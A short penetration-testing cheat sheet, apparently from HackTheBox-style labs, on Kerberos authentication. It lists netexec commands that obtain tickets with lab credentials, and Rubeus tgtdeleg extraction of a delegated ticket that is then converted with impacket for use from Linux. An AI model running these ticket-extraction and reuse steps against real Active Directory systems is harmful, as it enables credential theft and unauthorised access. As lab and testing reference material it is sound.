# Kerberos Authentication

## From Linux

{% code overflow="wrap" %}
```bash
nxc smb zoro.gold.local -u bonclay -p Ocotober2022 -k
```
{% endcode %}

{% code overflow="wrap" %}
```bash
nxc smb 10.129.15.xxx -u 'alex.turner' -p 'Checkt2024!' -k --generate-krb5-file /etc/krb5.conf

nxc smb 10.129.15.xxx -u 'alex.turner' -p 'Checkp4!' -d checkpoint.htb -k --generate-tgt 'alex.turner'

export KRB5CCNAME=alex.turner.ccache
```
{% endcode %}

## From Window to Linux

{% code overflow="wrap" %}
```bash
##We Extract a Delegated Kerberos Ticket
./Rubeus.exe tgtdeleg /nowrap

##We save the Base64-encoded Kerberos ticket to a file named tgt.b64 on our local attacker machine
base64 -d tgt.b64 > ryan.kirbi

##We Convert the Kerberos Ticket to a Credential Cache
impacket-ticketConverter ryan.kirbi ryan.ccache
```
{% endcode %}
